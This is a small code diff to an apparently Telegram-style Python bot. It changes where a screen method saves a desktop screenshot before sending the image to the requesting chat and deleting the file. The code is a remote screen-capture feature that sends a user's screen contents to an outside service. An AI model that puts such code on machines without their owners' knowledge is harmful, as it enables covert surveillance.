@@ -30,7 +30,7 @@ class Bot:
         pyautogui.keyUp('win')
 
     def screen(self, message):
-        dir_name = os.path.join(os.path.join(os.environ["USERPROFILE"]), "Pictures\\Screenshots")
+        dir_name = os.path.join(os.path.join(os.environ["USERPROFILE"]), "Pictures")
         pyautogui.screenshot(f'{dir_name}\\screen.png')
         bot.send_photo(message.chat.id, open(os.path.join(dir_name, 'screen.png'), 'rb'))
         os.remove(os.path.join(dir_name, 'screen.png'))
